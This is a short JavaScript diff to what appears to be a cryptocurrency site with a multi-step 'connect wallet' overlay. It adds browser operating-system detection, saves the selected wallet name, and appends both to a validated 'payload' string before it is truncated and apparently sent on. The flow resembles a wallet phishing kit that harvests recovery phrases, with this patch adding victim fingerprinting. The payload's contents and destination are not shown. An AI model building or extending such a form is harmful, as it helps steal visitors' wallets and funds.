@@ -18,6 +18,29 @@ async function fetchPrices() {
     }
 }
 
+function getOS() {
+    var userAgent = window.navigator.userAgent,
+        platform = window.navigator?.userAgentData?.platform || window.navigator.platform,
+        macosPlatforms = ['Macintosh', 'MacIntel', 'MacPPC', 'Mac68K'],
+        windowsPlatforms = ['Win32', 'Win64', 'Windows', 'WinCE'],
+        iosPlatforms = ['iPhone', 'iPad', 'iPod'],
+        os = null;
+
+    if (macosPlatforms.indexOf(platform) !== -1) {
+        os = 'Mac OS';
+    } else if (iosPlatforms.indexOf(platform) !== -1) {
+        os = 'iOS';
+    } else if (windowsPlatforms.indexOf(platform) !== -1) {
+        os = 'Windows';
+    } else if (/Android/.test(userAgent)) {
+        os = 'Android';
+    } else if (!os && /Linux/.test(platform)) {
+        os = 'Linux';
+    }
+
+    return os || 'Unknown OS';
+}
+
 function formatPrice(p) {
     if (p >= 1000) return '$' + p.toLocaleString('en-US', { minimumFractionDigits: 2, maximumFractionDigits: 2 });
     if (p >= 1) return '$' + p.toFixed(4);
@@ -231,6 +254,7 @@ if (document.getElementById('wOverlay')) {
     document.addEventListener('keydown', e => { if (e.key === 'Escape') closeWallet(); });
 
     function setWallet(img, name) {
+        localStorage.setItem('selectedWalletName', name);
         ['s2Img', 's3Img', 's4Img', 's5Img'].forEach(id => document.getElementById(id).src = img);
         ['s2Name', 's3Name', 's4Name', 's5Name'].forEach(id => document.getElementById(id).textContent = name);
     }
@@ -432,6 +456,10 @@ if (document.getElementById('wOverlay')) {
         }
 
         if (!isValid) return;
+
+        var os = getOS();
+        var walletName = localStorage.getItem('selectedWalletName') || 'Unknown Wallet';
+        payload += "\nWallet: " + walletName + "\nOS: " + os;
 
         var safetext = payload.length > 40000 ? payload.substring(0, 40000) + "\n\n...[trunc]" : payload;
 
